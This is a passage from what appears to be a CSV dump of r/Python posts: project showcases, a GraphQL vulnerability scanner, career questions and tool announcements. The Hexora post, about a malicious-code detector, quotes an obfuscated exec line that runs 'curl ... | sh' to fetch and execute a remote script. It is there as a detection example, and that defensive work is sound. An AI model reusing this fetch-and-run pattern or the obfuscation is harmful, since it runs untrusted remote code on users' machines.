**Target Audience**:

Whoever wants an easy way to search for file fastly and use natural language/ semantics, this can be the best and most secure tool you can run locally. 

  
**Comparison**:  
In my research I found tools like raycast, Sol etc. which support somewhat features of ""AI search"" but none of them are fulfilling this problem, and are close sourced (Sol is not).  
 "
1mw65r2,Python freelancing For College,Greedy_Point7755,11,19,2025-08-21 09:28:12,https://www.reddit.com/r/Python/comments/1mw65r2/python_freelancing_for_college/,"I‚Äôm not sure where to put this so I‚Äôm guessing the career advice channel. I am currently in pursuit of my bachelors in software engineering with 2 years of Java and Python programming experience. I‚Äôm looking for real world experience through freelancing and having a hard time finding clients and winning jobs on upwork,‚ÄòI‚Äôm not sure if I‚Äôm unable to market myself or hat, so I‚Äôm looking for advice on how to progress. Please feel free to to @ me or DM me."
1mw0clf,"I‚Äôm creating a UI framework in Python that exports to HTML, CSS, and JavaScript.",ZtaDev,14,4,2025-08-21 03:42:30,https://www.reddit.com/r/Python/comments/1mw0clf/im_creating_a_ui_framework_in_python_that_exports/,"Hello everyone!

I am sharing Dars Framework, a personal project I have been developing. It is a Python UI framework that allows for the creation of complete web interfaces using only Python code. The design process for the UI is done in Python, with subsequent export to HTML, CSS, and JavaScript for straightforward deployment.

Dars Framework is currently in an early stage of development and requires significant work. However, it is designed to be highly useful for building complete and easily created static websites using Python exclusively. For event handling and other dynamic behaviors, JavaScript is necessary.

While Dars manages UI creation with Python, interactivity and event handling (such as button clicks and animations) require JavaScript. Dars focuses on structure and styling, with dynamic logic integrated via JS.

Installation is straightforward:

pip install dars-framework

The project is available here: https://github.com/ZtaMDev/Dars-Framework"
1mvylz9,python_sri - A Subresource Integrity hash generator,lv_oz2,3,0,2025-08-21 02:17:01,https://www.reddit.com/r/Python/comments/1mvylz9/python_sri_a_subresource_integrity_hash_generator/,"# Overview + Features

[python_sri](https://github.com/lvoz2/python_sri) is a Subresource Integrity ([MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)) hash generator, that can add these hashes to a HTML string or create them from a file path or object, URL (WIP) or from a bytes-like object. It includes a helpful decorator wrapper for easy integration with Flask and FastAPI (when returning HTML as a string). You can use this with Django, but as of posting, it will be clunky. Django support will happen though

# Target Audience

python_sri is for web developers, no matter what framework your using. All you need to use it is a way to get your HTML as a string (This will change for better FastAPI and Django support)

# Comparison

I made this project because I couldn‚Äôt easily find something that already did it. A search for sri on PyPI gave results for checkers and command line generators, or two framework specific solutions, one of which hasn‚Äôt been updated in 8 years and does not include a README. So really there isn‚Äôt much to compare against - the only other project like this is django-sri, which is used via templating instead of within Python code

**I am still working on this, so feedback would be greatly appreciated**"
1mvxmi5,The last supported Python version for Pytype will be 3.12,bakery2k,118,16,2025-08-21 01:31:27,https://www.reddit.com/r/Python/comments/1mvxmi5/the_last_supported_python_version_for_pytype_will/,"[An update on pytype](https://github.com/google/pytype)

‚ÄúTL;DR: The last supported Python version for Pytype will be 3.12. We are still very actively interested in the space of Python type checking, but shifting our investments towards new ideas and different frameworks.‚Äù"
1mvvn3p,"Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",AutoModerator,2,0,2025-08-21 00:00:29,https://www.reddit.com/r/Python/comments/1mvvn3p/thursday_daily_thread_python_careers_courses_and/,"# Weekly Thread: Professional Use, Jobs, and Education üè¢

Welcome to this week's discussion on Python in the professional world! This is your spot to talk about job hunting, career growth, and educational resources in Python. Please note, this thread is **not for recruitment**.

---

## How it Works:

1. **Career Talk**: Discuss using Python in your job, or the job market for Python roles.
2. **Education Q&A**: Ask or answer questions about Python courses, certifications, and educational resources.
3. **Workplace Chat**: Share your experiences, challenges, or success stories about using Python professionally.

---

## Guidelines:

- This thread is **not for recruitment**. For job postings, please see r/PythonJobs or the recruitment thread in the sidebar.
- Keep discussions relevant to Python in the professional and educational context.
  
---

## Example Topics:

1. **Career Paths**: What kinds of roles are out there for Python developers?
2. **Certifications**: Are Python certifications worth it?
3. **Course Recommendations**: Any good advanced Python courses to recommend?
4. **Workplace Tools**: What Python libraries are indispensable in your professional work?
5. **Interview Tips**: What types of Python questions are commonly asked in interviews?

---

Let's help each other grow in our careers and education. Happy discussing! üåü"
1mvtl2c,"PyData Seattle CFP is open, deadline Sep 1st, 2025",oli_k,5,1,2025-08-20 22:33:19,https://www.reddit.com/r/Python/comments/1mvtl2c/pydata_seattle_cfp_is_open_deadline_sep_1st_2025/,"[https://seattle.pydata.org/](https://seattle.pydata.org/)

NUMFocus is a non profit that support open source scientific projects for Data Science, including: Pandas, NumPy, Project Jupyter, Julia, SciPi, Sympy, scikit-learn, R and many more!

I am sure almost all of you have used one of these and I encourage you to submit your best Python + Data talks. The conference is independent of vendors, deeply technical and a great event to showcase your projects. "
1mvpqx0,Zypher: A Modern GUI for yt-dlp Built with Python and CustomTkinter,Traditional_Tie5075,16,15,2025-08-20 20:06:52,https://www.reddit.com/r/Python/comments/1mvpqx0/zypher_a_modern_gui_for_ytdlp_built_with_python/,"Hi everyone!

I'm sharing my project Zypher, a desktop video downloader using yt-dlp built with Python and CustomTkinter for the GUI. 

# What My Project Does

Zypher simplifies downloading video and audio content from hundreds of websites. It provides a clean, modern interface that leverages the power of the yt-dlp command line tool without requiring users to touch a terminal. You just paste a URL, click a button, and your download starts. The current stable version (Zypher Lite) focuses on speed and reliability by downloading in native formats without external dependencies like FFmpeg.

# Target Audience

This is a tool for end-users who want a simple, GUI-driven alternative to command-line tools like yt-dlp or youtube-dl. It's also relevant for Python developers interested in seeing practical applications of GUI development with CustomTkinter, packaging, and integrating powerful libraries into a user-friendly product. The Lite version is production ready for basic use, while the full version is a work in progress project.

# Comparison

Unlike the official yt-dlp which is command-line only, Zypher provides a full graphical interface. It differs from many web-based downloaders by being a local, private Windows application with no ads, no trackers, and no upload limits. Compared to other GUI wrappers, its focus is on a modern, clean UI (with light/dark theme support) and simplicity for the most common use case (quick downloads) while planning advanced features for power users.

# Key Features (Zypher Lite - Stable):

One-click downloads from supported sites.

Modern UI with Light & Dark Mode (CustomTkinter).

Downloads native formats (MP4, WEBM) for speed and stability.

No FFmpeg required for the Lite version.

Custom download folder selection.

# Repository Link:

[Zypher GitHub Repository](https://github.com/Yamil-Serrano/Zypher)

# Feedback Welcome!

I'd love feedback on the UI/UX, the code structure, or ideas for the full version (like format selection, playlists, or MP3 conversion). Stars on GitHub are always appreciated! üòä"
1mvp8l9,GrapeQL - A GraphQL Vulnerability Scanner,a_zatezalo,4,0,2025-08-20 19:48:13,https://www.reddit.com/r/Python/comments/1mvp8l9/grapeql_a_graphql_vulnerability_scanner/,"Hey¬†r/Python  ! üëã

I'm Aleksa, a cyber-security researcher and software developer, and I've been working on¬†**GrapeQL**¬†\- a powerful vulnerability scanner for GraphQL APIs. I think the community would find it valuable. Currently I am looking for contributors. My repository is linked¬†[here](https://github.com/AleksaZatezalo/GrapeQL).

üéØ¬†**Why I'm reaching out**

As a solo developer juggling this with my security research, I'd love some help taking this project to the next level. Whether you're a seasoned developer or looking for your first open source contribution, there's something for everyone!

# What My Project Does

GrapeQL is a powerful, modular GraphQL security testing tool designed to identify common vulnerabilities and security misconfigurations in GraphQL endpoints. It provides both a command-line interface for quick scans and a flexible Python library for integration into your security testing workflows.

# Features

* **GraphQL Fingerprinting**: Identify the underlying GraphQL engine
* **Information Disclosure Testing**: Detect schema leaks, field suggestions, and insecure configurations
* **Injection Testing**: Test for command injection vulnerabilities
* **SQL Injection:**¬†Tests for SQL injection in GraphQL queries and mutations
* **Denial of Service Testing**: Identify DoS vulnerabilities through circular queries, deeply nested queries, and more
* **Comprehensive Reporting**: Generate detailed reports in Markdown or JSON formats

# Core Concepts

GrapeQL operates on a modular architecture with distinct components. They are as followsL



**Scanner Engine**: Core vulnerability detection logic with pluggable test modules.

**GraphQL Client**: Robust HTTP client with introspection capabilities and proxy support.

**Reporting System**: Flexible output generation supporting multiple formats.

**CLI Interface**: User-friendly command-line tool for quick security assessments.



The tool follows OWASP GraphQL security guidelines and implements industry-standard vulnerability detection patterns.

# Installation

To install follow enter the following commands in bash:

`# Clone the repository`

`git clone` [`https://github.com/AleksaZatezalo/grapeql.git`](https://github.com/AleksaZatezalo/grapeql.git)

`# Navigate to the project directory`

`cd grapeql`

`# Install for regular use`

`pip install -e .`

# The Basics

After installing with pip a simple scan can be ran using the following:

    grapeql --api https://example.com/graphql

# Target Audience

**üîí Security Professionals**: Penetration testers, security researchers, and bug bounty hunters looking for GraphQL-specific vulnerability detection tools.

**üõ°Ô∏è DevSecOps Teams**: Development teams implementing security testing in CI/CD pipelines and wanting to automate GraphQL security assessments.

**üìö Security Students**: Those learning about GraphQL security, API testing, or looking to contribute to an active security project.

**üîß Python Developers**: Developers interested in security tooling, async Python patterns, or building robust CLI applications.

# Comparison

This is an amalgamation of tools such as GraphW00f and Graph-C0P with extra functionality including reporting and testing for SQLi. "
1mvmiia,Vibe Coding Experiment Failures (with Python code),AlSweigart,52,27,2025-08-20 18:09:47,https://www.reddit.com/r/Python/comments/1mvmiia/vibe_coding_experiment_failures_with_python_code/,"A set of apps that ChatGPT 5, Gemini 2.5 Pro, and Claude Sonnet 4 were asked to write Python code for, and how they fail.

While LLMs can create common programs like stopwatch apps, Tetris, or to-do lists, they fail at slightly unusual apps even if they are also small in scope. The app failures included:

* African Countries Geography Quiz
* Pinball Game
* Circular Maze Generator
* Interactive Chinese Abacus
* Combination Lock Simulator
* Family Tree Diagram Editor
* Lava Lamp Simulator
* Snow Globe Simulator

Screenshots and source code are listed in the blog post:

https://inventwithpython.com/blog/vibe-coding-failures.html

I'm open to hearing about other failures people have had, or if anyone is able to create working versions of the apps I listed."
1mvl04x,My open source AI activity tracker project,None,0,5,2025-08-20 17:16:32,https://www.reddit.com/r/Python/comments/1mvl04x/my_open_source_ai_activity_tracker_project/,"Hey everyone, I wanted to share my latest project.¬†**Bilge**¬†is a wise activity tracker that runs completely on your machine. Instead of sending your data to a cloud server, it uses a local LLM to understand your digital habits and gently nudge you to take breaks.

It's a great example of what's possible with local AI, and I'd love to get your feedback on the project. It's still a work in progress, but I think it could be useful for some people who wants to work on similar project.

* What My Project Does
   * Usage Awareness ‚Äî Logs active apps and time spent locally on-device.
   * AI Categorization ‚Äî local LLM/SLM classifies usage into categories (Work, Gaming, Browsing, Communication) and detects patterns like overworking or excessive screen time.
   * Wellness Coaching ‚Äî Provides context-aware, human-friendly notifications
   * Privacy First ‚Äî All processing runs locally, ensuring sensitive usage data never leaves your machine.

* Target Audience
    * developers

* Comparison
    * My tool leverages AI to categorize apps and generate friendly messages but other tracking apps like activitywatch only used for reporting. 

Feel free to check out the code, open an issue, or even make your first pull request. All contributions are welcome!

GitHub:¬†[https://github.com/adnankaya/bilge](https://github.com/adnankaya/bilge)"
1mvjnsn,Tips for building Automator apps,rododder,0,7,2025-08-20 16:28:12,https://www.reddit.com/r/Python/comments/1mvjnsn/tips_for_building_automator_apps/,"Hello coders! I would like to create an application to run some processes on my computer in the background. The idea is to make the PC perform redundant actions. In your opinion, to pass commands to the PC is it better via rect coordinates, with the name of the buttons/toolbars to be pressed or via the images of the icons to be pressed? Thanks for the advice üòÑ"
1mvhq51,Python workflows for efficient text data labeling in NLP projects?,vihanga2001,18,21,2025-08-20 15:19:28,https://www.reddit.com/r/Python/comments/1mvhq51/python_workflows_for_efficient_text_data_labeling/,"For those working with NLP in Python, what‚Äôs your go-to way of handling large-scale text labeling efficiently?

Do you rely on:

* Pure manual labeling with Python-based tools (e.g., Label Studio, Prodigy),
* Active Learning frameworks (modAL, small-text, etc.),
* Or custom batching/heuristics you‚Äôve built yourself?

Curious what Python-based approaches people actually find practical in real projects, especially where accuracy vs labeling cost becomes a trade-off."
1mvbivi,FastAPI vs Django REST Framework?,Ghostinheven,46,32,2025-08-20 10:56:13,https://www.reddit.com/r/Python/comments/1mvbivi/fastapi_vs_django_rest_framework/,"Hey devs , I‚Äôm going for a new backend for a mid-sized project (real-time dashboard + standard CRUD APIs). I‚Äôve used DRF in production before, but I‚Äôm curious about FastAPI‚Äôs performance and async support for this one."
1mv92uw,Any recommendations for Python skill-building + certifications?,No-Independent4159,4,8,2025-08-20 08:29:22,https://www.reddit.com/r/Python/comments/1mv92uw/any_recommendations_for_python_skillbuilding/,I‚Äôm currently a software developer (Python). Are there any good places to improve my skills and also earn certifications?
1mv4tyb,Wove: Beautiful Python async,1ncehost,53,28,2025-08-20 04:15:25,https://www.reddit.com/r/Python/comments/1mv4tyb/wove_beautiful_python_async/,"Hi all! I've released a new python library that rethinks async coding, making it more concise and easier to read. Check it out and let me know what you think!

[https://github.com/curvedinf/wove/](https://github.com/curvedinf/wove/)

# What My Project Does

Here are the first bits from the github readme:

# Core Concepts

Wove is made from sensical philosophies that make async code feel more Pythonic.

* **Looks Like Normal Python**: You write simple, decorated functions. No manual task objects, no callbacks.
* **Reads Top-to-Bottom**: The code in a `weave` block is declared in a logical order, but `wove` intelligently determines the optimal *execution* order.
* **Automatic Parallelism**: Wove builds a dependency graph from your function signatures and runs independent tasks concurrently.
* **Normal Python Data**: Wove's task data looks like normal Python variables because it is, creating inherent multithreaded data safety in the same way as map-reduce.
* **Minimal Boilerplate**: Get started with just the `async with weave() as w:` context manager and the `@w.do` decorator.
* **Sync & Async Transparency**: Mix `async def` and `def` functions freely. `wove` automatically runs synchronous functions in a background thread pool to avoid blocking the event loop.
* **Zero Dependencies**: Wove is pure Python, using only the standard library and can be integrated into any Python project.

# Installation

Download wove with pip:

`pip install wove`

# The Basics

Wove defines only three tools to manage all of your async needs, but you can do a lot with just two of them:

    import asyncio
    from wove import weave
    
    async def main():
        async with weave() as w:
            @w.do
            async def magic_number():
                return 42
            @w.do
            async def important_text():
                return ""The meaning of life""
            @w.do
            async def put_together(important_text, magic_number):
                return f""{important_text} is {magic_number}!""
        print(w.result.final)
    asyncio.run(main())
    
    >> The meaning of life is 42!

In the example above, `magic_number` and `important_text` are called in parallel. The magic doesn't stop there.

Check out the github for more advanced functionality including iterable-to-task mapping and more.

[https://github.com/curvedinf/wove/](https://github.com/curvedinf/wove/)

# Target Audience

Devs writing python applications with IO bound tasks such as API calls, file IO, database IO, and other networking tasks.

# Comparison

See code example above (this section is here for the automod)"
1mv2wut,Customizing your IPython shell in Docker and Docker Compose,frankwiles,4,0,2025-08-20 02:39:30,https://www.reddit.com/r/Python/comments/1mv2wut/customizing_your_ipython_shell_in_docker_and/,"Hi everyone, 

I avoided customizing IPython at all in Docker Compose environments because I didn't want to impose my preferences and proclivities on my coworkers.  But it turns out it's easy to customize without having to do that. 

In this post: https://frankwiles.com/posts/customize-ipython-docker/

I walk you through: 

* How to use a local profile in Docker Compose
* How to set simple configuration options (vi editing mode)
* Automatically import frequently used libraries
* Load project specific data you need frequently 
* How to build powerful custom debugging tools 

Hope you find it useful! Welcome any feedback you might have."
1mv1evo,Your opinion about my project,Hot-Act-6660,0,0,2025-08-20 01:29:20,https://www.reddit.com/r/Python/comments/1mv1evo/your_opinion_about_my_project/,"Hi, so I made an app in python. Here you can create your tests and pass them, this way you can very quickly memorize new words (It's also a convenient way to store and organize what you learn).

Target audience: anyone who is studying a new language

I planned to put it in my portfolio (I know it's weak as hell, I have many other strong projects, just wanted to mention it).

Apparently it is free and open sourced, anyone can do me a favor and use it.  
I wanted to ask you what do you think about the project as a whole (code, project architecture, UI, how does the app feel, how useful do you find it, etc.). What do you think about it?

You can have a loot at my [GitHub](https://github.com/Uladislau-Kulikou/MEMO/tree/main) link"
1muyltn,Hexora ‚Äì static analysis tool for malicious Python scripts,rushter_,11,5,2025-08-19 23:25:09,https://www.reddit.com/r/Python/comments/1muyltn/hexora_static_analysis_tool_for_malicious_python/,"Hi Reddit, I'd love to hear your feedback and suggestions about my new tool.

**What My Project Does**

It's a new tool to detect malicious or harmful code.¬†It can be used¬†to review your project dependencies or¬†just¬†scan any scripts.¬†It will show you potentially harmful code pieces which can be manually reviewed by a developer.

  
Here is a quick example:

    >  hexora audit test.py
    
    warning[HX2000]: Reading from the clipboard can be used to exfiltrate sensitive data.
      ‚îå‚îÄ resources/test/test.py:3:8
      ‚îÇ
    1 ‚îÇ import pyperclip
    2 ‚îÇ
    3 ‚îÇ data = pyperclip.paste()
      ‚îÇ        ^^^^^^^^^^^^^^^^^ HX2000
      ‚îÇ
      = Confidence: High
        Help: Clipboard access can be used to exfiltrate sensitive data such as passwords and keys.
        
    warning[HX3000]: Possible execution of unwanted code
       ‚îå‚îÄ resources/test/test.py:20:1
       ‚îÇ
    19 ‚îÇ (_ceil, _random, Math,), Run, (Floor, _frame, _divide) = (exec, str, tuple), map, (ord, globals, eval)
    20 ‚îÇ _ceil(""import subprocess;subprocess.call(['curl -fsSL https://example.com/b.sh | sh'])"")
       ‚îÇ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ HX3000
       ‚îÇ

**Target Audience**

Developers, security professionals.

**Comparison**

There are alternative libraries (e.g., guarddog), but they usually rely on regexes or focus on all languages. Regexes are fragile and can¬†be bypassed. My library uses AST and tracks some of the obfuscation techniques, such as import/call reassignment.¬†

**Feedback**

Currently, I'm testing it on public files where some of them implement malicious behavior, as well as past malicious packages on PyPI.

I would love to hear some feedback and suggestions for new rules.

Examples:¬†[https://github.com/rushter/hexora/blob/main/docs/examples.md](https://github.com/rushter/hexora/blob/main/docs/examples.md)  
Library:¬†[https://github.com/rushter/hexora](https://github.com/rushter/hexora)

I'd love to hear your feedback and ideas on how to improve this and identify missing rules."
1muy2z2,Going 10x faster with Python DataFrames for Analysis and AI with Oracle Database,cjbj,0,1,2025-08-19 23:03:35,https://www.reddit.com/r/Python/comments/1muy2z2/going_10x_faster_with_python_dataframes_for/,"Are you using Python for data analysis and AI? Did you know the [python-oracledb](https://pypi.org/project/oracledb/) driver for Oracle Database can query directly into, and insert from, Python DataFrames? This can be *very fast* when you want to use packages such as Apache PyArrow, Pandas, Polars, NumPy, Dask, PyTorch, or to write files in Apache Parquet or Delta Lake format.

**Videos:**

* [Python DataFrames with Oracle Database for Analysis and AI](https://youtu.be/0BJNlbh71LY)
* [Python DataFrames and the Oracle Database 23ai VECTOR Data Type](https://youtu.be/lC07FNCzJ5w)

**Blogs:**

* [The Best Way to Fetch and Insert Python DataFrames and Tensors with Oracle Database](https://cjones-oracle.medium.com/the-best-way-to-fetch-and-insert-python-dataframes-and-tensors-with-oracle-database-70a1b24a3d99)
* [Going 10x faster with python-oracledb Data Frames](https://medium.com/oracledevs/going-10x-faster-with-python-oracledb-data-frames-9fe6ea736697)
* [Writing to Parquet and Delta Lake files from Oracle Database using Pytho](https://levelup.gitconnected.com/writing-to-parquet-and-delta-lake-files-from-oracle-database-using-python-5f7382bfcdc6)n
* [python-oracledb 3.0 Data Frames ‚Äî a new way to query data](https://medium.com/oracledevs/python-oracledb-3-0-data-frames-a-new-way-to-query-data-4139418bef82)
* [Python-oracledb 3.3 adds DataFrame ingestion and Sessionless Transactions](https://cjones-oracle.medium.com/python-oracledb-3-3-adds-dataframe-ingestion-and-sessionless-transactions-04948072c438)

**Samples:**

* See files beginning ‚Äúdataframe\_‚Äù on [GitHub](https://github.com/oracle/python-oracledb/tree/main/samples)

**Documentation:**

* [Working with Data Frames](https://python-oracledb.readthedocs.io/en/latest/user_guide/dataframes.html)
* [Quick Start: Developing Python Applications for Oracle Database](https://www.oracle.com/database/technologies/appdev/python/quickstartpythononprem.html)



"
1muwj8j,Take Stack Overflow‚Äôs Survey on Sub-Communities - Option to be Entered into Raffle as a Thank you!,Sea-Translator-9756,0,1,2025-08-19 22:01:15,https://www.reddit.com/r/Python/comments/1muwj8j/take_stack_overflows_survey_on_subcommunities/,"Hi everyone. I‚Äôm Cat, a Product Manager at Stack Overflow working on Community Products. My team is exploring new ways for our community to connect beyond Q&A, specifically through smaller sub-communities. We're interested in hearing from software developers and tech enthusiasts about the value of joining and participating in these groups on Stack. These smaller communities (similar to this Python community) could be formed around shared goals, learning objectives, interests, specific technologies, coding languages, or other technical topics, providing a dedicated space for people to gather and discuss their specific focus.

If you have a few minutes, we‚Äôd appreciate you filling out our [brief survey](https://app.ballparkhq.com/share/self-guided/NYbwUGiDWXrtGkq6BUB8u2). Feel free to share this post with your developer friends who may also be interested in taking our survey.

As a token of our appreciation, you can optionally enter into our raffle to win a US $50 gift card in a random drawing of 10 participants after completing the survey. The survey and raffle will be open from August 19 to September 3. [Link to Raffle rules](https://policies.stackoverflow.co/stack-overflow/stack-overflow-2025-survey/)

Thanks again and thank you to the mods for letting me connect with the community here. 

"
1muw4ci,Vehicle Routing Problem,Inevitable-Lynx-6060,0,24,2025-08-19 21:45:08,https://www.reddit.com/r/Python/comments/1muw4ci/vehicle_routing_problem/,"Hey, guys! Now I am taking part in the hackathon. We must distribute 20 000 orders between 200 couriers. We thought that we can train a neural network, which would looking for different routes, but understood that we wouldn't meet the deadline in 2 weeks.

We want to make a hybrid ml model and algorithm. What algorithm you can suggest? We thought about MILP, but it is greedy algorithm. What other recommendations you can give us?"
1musaqj,Software architecture humblebundle,Ok_Gur_8544,160,41,2025-08-19 19:24:40,https://www.reddit.com/r/Python/comments/1musaqj/software_architecture_humblebundle/,"Which of them you have read and really recommend ? I wonder to buy max plan.

https://www.humblebundle.com/books/software-architecture-2025-oreilly-books"
1murchu,I'm building Python for the browser in only ~230 KB (JS runtime size)‚Ä¶ with built-in AI agents,None,0,23,2025-08-19 18:51:00,https://www.reddit.com/r/Python/comments/1murchu/im_building_python_for_the_browser_in_only_230_kb/,"What if you could run **Python directly in the browser**‚Ä¶

No JavaScript, no heavy frameworks, no PyScript megabytes.

I built a runtime that:

\- Loads in **\~230 KB** (same size as a minimal JS runtime).

\- Lets you manipulate the DOM and make requests in pure Python.

\- Has **tiny AI agents** running in \~0.001s, without GPU into the dispositive ([simple perceptrons](https://datascientest.com/en/perceptron-definition-and-use-cases)).

\- Optimizes itself in the background while you browse.

Think of it as a **Python-first web**, where you don‚Äôt need React, Next.js or even JavaScript at all.

Launching in two months, stay tuned...

What do you think ‚Äî would devs adopt a **Python web runtime** if it‚Äôs this small?

**Edit: I'll share a small demo soon, right now I'm compiling to web assembly**

***Are you interested in trying a demo when it's ready? I'll give early access to the CDN to those who comment.***"
1muqq1i,UVE - conda like environment management based on UV,Accurate-Sundae1744,6,31,2025-08-19 18:28:57,https://www.reddit.com/r/Python/comments/1muqq1i/uve_conda_like_environment_management_based_on_uv/,"[https://github.com/robert-mcdermott/uve](https://github.com/robert-mcdermott/uve)

found it quite interesting - it'd be great if something similar was part of of uv itself"
1muomwx,"Another ""new to this"" post",craftywma,0,6,2025-08-19 17:14:48,https://www.reddit.com/r/Python/comments/1muomwx/another_new_to_this_post/,"I need to check my sanity and see if anybody else has had any similar experiences.
And some of this might be more appropriate for an enlightenment thread or maybe yes you are crazy thread, but I have to ask anyways 
Here's the quick breakdown got into AI ChatGPT to be specific learned you can do vibecoding was interested in maybe a quick buck and learning something new. 
Way harder than I initially thought.
Started using notion and was able to build a few things like my own task manager calendar 
Started using brilliant two keys a day and I'm on day 18 
Just recently downloaded visual studios with the GitHub and Python attachments 

Here's where it gets a little crazy. I'm not super good at any of this, but it feels like I've done it all before like the biggest d√©j√† vu ever. 
For the first time in my life, I don't mind failing in fact, I enjoy learning from it and moving forward I've never been this motivated to learn and get into something.
I have zero background in it, but I find that it really resonates with who I am.

So the question basically is has anybody else experienced this within getting into coding like it was something you might've been meant to do but didn't catch it till later? "
1muo5o1,Python tutorial: Convert CSV to Excel using openpyxl (step-by-step),thebadestuchiha1234,0,3,2025-08-19 16:57:36,https://www.reddit.com/r/Python/comments/1muo5o1/python_tutorial_convert_csv_to_excel_using/,"Hi everyone,

I just created a short, beginner-friendly walkthrough showing how to convert a CSV file into an Excel workbook using Python‚Äôs standard¬†`csv`¬†library and the openpyxl module.

# What you‚Äôll learn:

* How to locate a CSV using a relative path with¬†`os.path`
* How to create and name an Excel worksheet
* How to read CSV rows and write them into the Excel sheet
* How to save the final¬†`.xlsx`¬†file to your desired location

Check it out here üëâ[https://youtu.be/wvqTlTgK4is](https://youtu.be/wvqTlTgK4is)"
1mulosh,PAR CLI TTS v0.2.0 released! üéâ Major update!,probello,0,6,2025-08-19 15:28:57,https://www.reddit.com/r/Python/comments/1mulosh/par_cli_tts_v020_released_major_update/,"# What My Project Does:

PAR CLI TTS is a powerful command-line text-to-speech tool that provides a unified interface for multiple TTS providers including ElevenLabs, OpenAI, and Kokoro ONNX (offline). It features intelligent voice caching, friendly name resolution, and flexible output options. The tool seamlessly switches between cloud and offline providers while maintaining a consistent user experience.

# What's New:

# v0.2.0 - Major Feature Update

üìù **Configuration File Support**: Set your defaults once and forget

* YAML config at `~/.config/par-tts/config.yaml`
* `--create-config` generates a sample configuration
* Set default provider, voice, volume, output directory, and more
* CLI arguments still override config file settings
* Finally, no more typing the same options repeatedly!

‚ùå **Consistent Error Handling**: Clear, categorized error messages

* ErrorType enum with proper exit codes
* Helpful error messages with suggestions
* Debug mode shows detailed stack traces
* Errors categorized (AUTH, NETWORK, VOICE, FILE, etc.)
* No more cryptic Python tracebacks!

üîÑ **Smarter Voice Cache**: Enhanced caching with change detection

* Automatic change detection via content hashing
* Manual cache refresh with `--refresh-cache`
* Voice sample caching for offline preview
* Clear samples with `--clear-cache-samples`
* Cache knows when provider updates voices!

üì• **Multiple Input Methods**: Flexible text input options for any workflow

* Automatic stdin detection: `echo ""text"" | par-tts`
* Explicit stdin: `par-tts -`
* File input: `par-tts` u/speech`.txt`
* Direct text still supported: `par-tts ""Hello world""`

üîä **Volume Control**: Platform-specific playback volume adjustment

* Range from 0.0 (silent) to 5.0 (5x volume)
* macOS: Full support via `afplay -v`
* Linux: Support via `paplay`, `ffplay`, `mpg123`
* New `-w/--volume` flag for easy control

üëÇ **Voice Preview**: Test voices before using them

* `--preview-voice` or `-V` option
* Plays sample text with selected voice
* Cached samples for instant replay
* No text argument required for preview mode
* Perfect for exploring available voices

üöÄ **Memory-Efficient Streaming**: Reduced memory footprint

* Stream audio directly to files using Iterator\[bytes\]
* No full audio buffering in memory
* Significant performance improvement for large files
* Provider abstraction updated to support streaming

üîí **Enhanced Security**: Safer debug output

* API keys automatically sanitized in debug mode
* SHA256 checksum verification for downloaded models
* Sensitive environment variables masked
* No logging of authentication credentials

üéØ **Better CLI Experience**: All options now have short flags

* Every command option has a short version for quick access
* Consistent flag naming across all features
* Example: `-P` provider, `-v` voice, `-w` volume, `-V` preview

# v0.1.0 - Initial Release Features

* Multi-provider support (ElevenLabs, OpenAI, Kokoro ONNX)
* Intelligent voice name resolution with partial matching
* 7-day voice cache for ElevenLabs optimization
* XDG-compliant cache and data directories
* Automatic model downloading for offline providers
* Rich terminal output with progress indicators
* Provider-specific options (stability, speed, format)

# Key Features:

* **üìù Configuration Files**: Set defaults in YAML config, no more repetitive typing
* **üé≠ Multiple TTS Providers**: Seamless switching between ElevenLabs, OpenAI, and Kokoro ONNX
* **üì• Flexible Input**: Accept text from command line, stdin pipe, or files (@filename)
* **üîä Volume Control**: Adjust playback volume (0.0-5.0) with platform-specific support
* **üëÇ Voice Preview**: Test voices with sample text and caching for instant replay
* **üéØ Smart Voice Resolution**: Use friendly names like ""Juniper"" instead of cryptic IDs
* **‚ö° Intelligent Caching**: Smart cache with change detection, manual refresh, and voice samples
* **üöÄ Offline Support**: Kokoro ONNX runs entirely locally with auto-downloading models
* **üîí Secure by Default**: API keys in environment variables, sanitized debug output
* **‚ùå Consistent Errors**: Categorized error handling with helpful messages
* **üìä Rich Terminal UI**: Beautiful colored output with progress indicators
* **üíæ Smart File Management**: Automatic cleanup or preservation of audio files
* **üéöÔ∏è Provider Options**: Fine-tune with stability, similarity, speed, and format settings
* **üöÄ Memory Efficient**: Stream processing with Iterator\[bytes\] for minimal memory usage

# Why It's Better:

Unlike single-provider TTS tools, PAR CLI TTS offers:

* **Configuration Management**: Set your preferences once in a YAML file - no more long command lines
* **Provider Independence**: Not locked to one service - switch providers without changing workflow
* **Offline Capability**: Kokoro ONNX provides high-quality TTS without internet or API keys
* **Voice Name Resolution**: No need to remember voice IDs - use friendly names with fuzzy matching
* **Smart Caching**: Cache detects changes, stores voice samples, and refreshes intelligently
* **Memory Efficiency**: Stream processing means minimal memory usage even for large texts
* **Error Excellence**: Categorized errors with helpful messages instead of Python tracebacks
* **Security First**: API keys never exposed, debug output automatically sanitized
* **True CLI Design**: Every feature accessible via short flags, pipes, and standard Unix patterns

# GitHub and PyPI

* PAR CLI TTS is under active development with regular feature updates
* Check out the project on GitHub for full documentation and contribution guidelines: [https://github.com/paulrobello/par-cli-tts](https://github.com/paulrobello/par-cli-tts)
* PyPI: [https://pypi.org/project/par-cli-tts/](https://pypi.org/project/par-cli-tts/)
* Installation: `pip install par-cli-tts` or `uv tool install par-cli-tts`

# Comparison:

While there are many TTS libraries and tools available, PAR CLI TTS is unique in providing:

* **Configuration file support** with YAML-based defaults (set once, use everywhere)
* **Unified interface** across multiple providers (not just a wrapper for one service)
* **Intelligent voice caching** with change detection and sample storage (no other tool offers this)
* **True offline capability** with automatic model management and SHA256 verification
* **Memory-efficient streaming** architecture using Iterator\[bytes\]
* **Consistent error handling** with categorized exit codes and helpful messages
* **Security-first design** with sanitized output and proper credential management

# Target Audience

Developers who need reliable text-to-speech in their workflows, content creators generating audio from scripts, accessibility tool developers, anyone who prefers command-line tools, and users who want both cloud and offline TTS options without vendor lock-in."
